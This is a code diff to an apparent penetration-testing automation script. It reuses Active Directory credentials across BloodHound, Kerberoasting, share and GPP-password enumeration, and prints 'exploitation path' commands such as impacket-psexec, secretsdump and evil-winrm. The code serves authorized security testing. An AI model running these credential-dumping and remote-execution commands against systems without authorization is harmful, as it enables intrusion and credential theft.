@@ -41,6 +41,9 @@ class Config:
         self.discovered_hosts = []
         self.discovered_ports = {}
         self.credentials = None
+        self.ad_username = None
+        self.ad_password = None
+        self.ad_domain = None
         self.stealth_mode = False
         self.threads = 50
         self.scan_depth = 2
@@ -210,6 +213,7 @@ def run_command(cmd, description="", timeout=None, show_command=True):
         process = subprocess.Popen(
             cmd,
             shell=True,
+            stdin=subprocess.DEVNULL,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True
@@ -1021,10 +1025,88 @@ def enumerate_smb():
     
     # Enum4linux
     if tool_exists('enum4linux'):
-        console.print("[cyan]Running enum4linux...[/cyan]")
-        output_file = f"{config.output_dir}/enum4linux.txt"
-        cmd = f"enum4linux -a {config.target_ip} > {output_file}"
-        run_command(cmd, "enum4linux enumeration", timeout=300)
+        console.print("[dim]Running enum4linux. [bold yellow]Press Ctrl+Z to skip.[/bold yellow][/dim]\n")
+        cmd = f"enum4linux -a {config.target_ip}"
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+            console=console
+        ) as progress:
+            task = progress.add_task("[cyan]Running enum4linux...", total=100)
+            stdout, stderr, code = run_command(cmd, "enum4linux enumeration", timeout=300, show_command=False)
+            progress.update(task, completed=100)
+
+        if stdout:
+            save_output("enum4linux.txt", stdout, command=cmd)
+
+            # Display key findings with colors
+            console.print("\n[bold cyan]enum4linux Results:[/bold cyan]")
+
+            # OS information
+            os_lines = re.findall(r'\[\+\]\s*OS info.*', stdout)
+            for line in os_lines:
+                console.print(f"  [green]{line.strip()}[/green]")
+
+            # Domain/Workgroup
+            domain_lines = re.findall(r'\[\+\]\s*Got domain/workgroup.*', stdout)
+            for line in domain_lines:
+                console.print(f"  [green]{line.strip()}[/green]")
+
+            # Users found
+            users = re.findall(r'user:\[([^\]]+)\]', stdout)
+            if users:
+                console.print(f"\n  [bold green]Users found ({len(users)}):[/bold green]")
+                for user in users:
+                    console.print(f"    - {user}")
+
+            # Shares found
+            share_lines = re.findall(r'\[\+\]\s*Enumerating.*shares', stdout, re.IGNORECASE)
+            shares_found = re.findall(r'^\s+([\w\$]+)\s+Disk', stdout, re.MULTILINE)
+            if shares_found:
+                console.print(f"\n  [bold green]Shares found ({len(shares_found)}):[/bold green]")
+                for share in shares_found:
+                    console.print(f"    - {share}")
+
+            # Password policy
+            policy_match = re.search(r'Minimum password length:\s*(\d+)', stdout)
+            lockout_match = re.search(r'Account Lockout Threshold:\s*(\d+)', stdout)
+            if policy_match or lockout_match:
+                console.print(f"\n  [bold green]Password Policy:[/bold green]")
+                if policy_match:
+                    console.print(f"    Min length: {policy_match.group(1)}")
+                if lockout_match:
+                    threshold = lockout_match.group(1)
+                    color = "bold red" if threshold == "0" else "green"
+                    console.print(f"    Lockout threshold: [{color}]{threshold}[/{color}]")
+
+            # Groups
+            groups = re.findall(r'group:\[([^\]]+)\]', stdout)
+            if groups:
+                console.print(f"\n  [bold green]Groups found ({len(groups)}):[/bold green]")
+                for group in groups[:10]:
+                    console.print(f"    - {group}")
+                if len(groups) > 10:
+                    console.print(f"    [dim]... and {len(groups) - 10} more (see full output)[/dim]")
+
+            console.print(f"\n  [dim]Full output saved to: {config.output_dir}/enum4linux.txt[/dim]")
+
+            # Add to report
+            enum4linux_report = ""
+            if users:
+                user_list = '\n'.join(f'- {u}' for u in users)
+                enum4linux_report += f"**Users ({len(users)}):**\n{user_list}\n\n"
+            if shares_found:
+                share_list = '\n'.join(f'- {s}' for s in shares_found)
+                enum4linux_report += f"**Shares ({len(shares_found)}):**\n{share_list}\n\n"
+            if groups:
+                group_list = '\n'.join(f'- {g}' for g in groups)
+                enum4linux_report += f"**Groups ({len(groups)}):**\n{group_list}\n\n"
+            if enum4linux_report:
+                add_to_report("enum4linux Enumeration", enum4linux_report, commands=cmd)
+        else:
+            console.print("[yellow]enum4linux returned no output[/yellow]")
 
 def check_active_directory():
     """Check if target appears to be Active Directory"""
@@ -1066,6 +1148,11 @@ def enumerate_active_directory():
         domain = shell_quote(console.input("[bold yellow]Domain (or press Enter for default):[/bold yellow] ").strip())
         username = shell_quote(console.input("[bold yellow]Username:[/bold yellow] ").strip())
         password = shell_quote(console.input("[bold yellow]Password:[/bold yellow] ").strip())
+
+        # Store credentials for reuse across all AD sub-phases
+        config.ad_username = username
+        config.ad_password = password
+        config.ad_domain = domain
 
         if domain:
             config.credentials = f"{domain}/{username}:{password}"
@@ -1362,13 +1449,13 @@ def enumerate_ad_bloodhound():
     run_bh = console.input("[bold yellow]Run BloodHound collection? (y/n):[/bold yellow] ").strip().lower()
     if run_bh != 'y':
         return
-    
-    username = shell_quote(console.input("[yellow]Username:[/yellow] ").strip())
-    password = shell_quote(console.input("[yellow]Password:[/yellow] ").strip())
-    domain = shell_quote(console.input("[yellow]Domain:[/yellow] ").strip())
+
+    username = config.ad_username
+    password = config.ad_password
+    domain = config.ad_domain
 
     if not all([username, password, domain]):
-        console.print("[red]All fields required for BloodHound[/red]")
+        console.print("[red]All fields required for BloodHound (username, password, domain)[/red]")
         return
     
     console.print(f"\n[bold]Command:[/bold] [yellow]bloodhound-python -d {domain} -u {username} -p [REDACTED] -dc {config.target_ip} -c All --zip[/yellow]")
@@ -1414,17 +1501,13 @@ def enumerate_ad_bloodhound():
 def enumerate_ad_kerberoasting():
     """Attempt Kerberoasting to find service accounts"""
     console.print("\n[bold cyan]═══ Kerberoasting ═══[/bold cyan]")
-    
-    username = shell_quote(console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip())
-    if not username:
-        console.print("[dim]Skipping Kerberoasting (requires credentials)[/dim]")
-        return
 
-    password = shell_quote(console.input("[yellow]Password:[/yellow] ").strip())
-    domain = shell_quote(console.input("[yellow]Domain:[/yellow] ").strip())
+    username = config.ad_username
+    password = config.ad_password
+    domain = config.ad_domain
 
-    if not all([password, domain]):
-        console.print("[yellow]Domain and password required, skipping...[/yellow]")
+    if not all([username, password, domain]):
+        console.print("[dim]Skipping Kerberoasting (requires username, password, and domain)[/dim]")
         return
     
     kerberoast_found = False
@@ -1505,7 +1588,7 @@ def test_credentials_everywhere():
         stdout, stderr, code = run_command(cmd, "SMB credential test", show_command=False)
         
         is_admin = "Pwn3d!" in stdout
-        is_valid = is_admin or "(+)" in stdout or "STATUS_SUCCESS" in stdout
+        is_valid = is_admin or "[+]" in stdout or "STATUS_SUCCESS" in stdout
         results['SMB'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
     
     # Test WinRM
@@ -1517,7 +1600,7 @@ def test_credentials_everywhere():
         stdout, stderr, code = run_command(cmd, "WinRM credential test", show_command=False)
         
         is_admin = "Pwn3d!" in stdout
-        is_valid = is_admin or "(+)" in stdout
+        is_valid = is_admin or "[+]" in stdout
         results['WinRM'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
     
     # Test RDP
@@ -1527,7 +1610,7 @@ def test_credentials_everywhere():
         if domain:
             cmd += f" -d '{domain}'"
         stdout, stderr, code = run_command(cmd, "RDP credential test", show_command=False)
-        is_valid = "(+)" in stdout or "Authentication successful" in stdout
+        is_valid = "[+]" in stdout or "Authentication successful" in stdout
         results['RDP'] = 'Valid' if is_valid else 'Invalid'
     
     # Test MSSQL
@@ -1539,7 +1622,7 @@ def test_credentials_everywhere():
         stdout, stderr, code = run_command(cmd, "MSSQL credential test", show_command=False)
         
         is_admin = "Pwn3d!" in stdout
-        is_valid = is_admin or "(+)" in stdout
+        is_valid = is_admin or "[+]" in stdout
         results['MSSQL'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
     
     # Test SSH (if domain machine has SSH)
@@ -1572,28 +1655,39 @@ def test_credentials_everywhere():
     
     # Provide recommendations
     if admin_access or valid_access:
-        console.print(f"\n[yellow]💡 Recommended Actions:[/yellow]")
-        
+        rec_lines = []
+
         if 'Admin' in results.get('SMB', ''):
-            console.print(f"   • [red]SMB Admin[/red] - Use psexec/secretsdump:")
-            console.print(f"     impacket-psexec {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
-            console.print(f"     impacket-secretsdump {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
-        
+            rec_lines.append(f"[bold red]CRITICAL - SMB Admin Access (Pwn3d!)[/bold red]")
+            rec_lines.append(f"  [bold yellow]impacket-psexec {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}[/bold yellow]")
+            rec_lines.append(f"  [bold yellow]impacket-secretsdump {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}[/bold yellow]")
+            rec_lines.append("")
+
         if 'Admin' in results.get('WinRM', '') or 'Valid' in results.get('WinRM', ''):
-            console.print(f"   • [green]WinRM Access[/green] - Use evil-winrm:")
-            console.print(f"     evil-winrm -i {config.target_ip} -u {username} -p '{password}'" + (f" -d {domain}" if domain else ""))
-        
+            winrm_label = "[bold red]CRITICAL - WinRM Admin Access[/bold red]" if 'Admin' in results.get('WinRM', '') else "[bold green]WinRM Access[/bold green]"
+            rec_lines.append(winrm_label)
+            rec_lines.append(f"  [bold yellow]evil-winrm -i {config.target_ip} -u {username} -p '{password}'" + (f" -d {domain}" if domain else "") + "[/bold yellow]")
+            rec_lines.append("")
+
         if 'Admin' in results.get('MSSQL', '') or 'Valid' in results.get('MSSQL', ''):
-            console.print(f"   • [green]MSSQL Access[/green] - Use impacket-mssqlclient:")
-            console.print(f"     impacket-mssqlclient {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
-        
+            mssql_label = "[bold red]CRITICAL - MSSQL Admin Access[/bold red]" if 'Admin' in results.get('MSSQL', '') else "[bold green]MSSQL Access[/bold green]"
+            rec_lines.append(mssql_label)
+            rec_lines.append(f"  [bold yellow]impacket-mssqlclient {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}[/bold yellow]")
+            rec_lines.append("")
+
         if 'Valid' in results.get('SSH', ''):
-            console.print(f"   • [green]SSH Access[/green]:")
-            console.print(f"     ssh {username}@{config.target_ip}")
-        
+            rec_lines.append(f"[bold green]SSH Access[/bold green]")
+            rec_lines.append(f"  [bold yellow]ssh {username}@{config.target_ip}[/bold yellow]")
+            rec_lines.append("")
+
         if 'Valid' in results.get('RDP', ''):
-            console.print(f"   • [green]RDP Access[/green]:")
-            console.print(f"     xfreerdp /v:{config.target_ip} /u:{username} /p:'{password}'" + (f" /d:{domain}" if domain else ""))
+            rec_lines.append(f"[bold green]RDP Access[/bold green]")
+            rec_lines.append(f"  [bold yellow]xfreerdp /v:{config.target_ip} /u:{username} /p:'{password}'" + (f" /d:{domain}" if domain else "") + "[/bold yellow]")
+            rec_lines.append("")
+
+        border = "red" if admin_access else "green"
+        title = "EXPLOITATION PATHS" if admin_access else "Recommended Actions"
+        console.print(Panel('\n'.join(rec_lines), title=f"[bold]{title}[/bold]", border_style=border, padding=(1, 2)))
     
     # Save results
     save_output("credential_validation.txt", 
@@ -1604,14 +1698,14 @@ def test_credentials_everywhere():
 def enumerate_ad_shares_deep():
     """Deep enumeration of SMB shares looking for sensitive files"""
     console.print("\n[bold cyan]═══ Deep Share Enumeration ═══[/bold cyan]")
-    
-    username = shell_quote(console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip())
-    if not username:
-        console.print("[dim]Skipping (requires credentials)[/dim]")
-        return
 
-    password = shell_quote(console.input("[yellow]Password:[/yellow] ").strip())
-    domain = shell_quote(console.input("[yellow]Domain (optional):[/yellow] ").strip())
+    username = config.ad_username
+    password = config.ad_password
+    domain = config.ad_domain
+
+    if not username or not password:
+        console.print("[dim]Skipping deep share enumeration (requires credentials)[/dim]")
+        return
 
     if not tool_exists('netexec'):
         console.print("[yellow]NetExec not found, skipping[/yellow]")
@@ -1646,14 +1740,14 @@ def enumerate_ad_shares_deep():
 def enumerate_ad_gpp():
     """Check for Group Policy Preferences passwords"""
     console.print("\n[bold cyan]═══ GPP Password Extraction ═══[/bold cyan]")
-    
-    username = shell_quote(console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip())
-    if not username:
-        console.print("[dim]Skipping (requires credentials)[/dim]")
-        return
 
-    password = shell_quote(console.input("[yellow]Password:[/yellow] ").strip())
-    domain = shell_quote(console.input("[yellow]Domain:[/yellow] ").strip())
+    username = config.ad_username
+    password = config.ad_password
+    domain = config.ad_domain
+
+    if not all([username, password, domain]):
+        console.print("[dim]Skipping GPP extraction (requires username, password, and domain)[/dim]")
+        return
 
     if not tool_exists('netexec'):
         console.print("[yellow]NetExec not found, skipping[/yellow]")
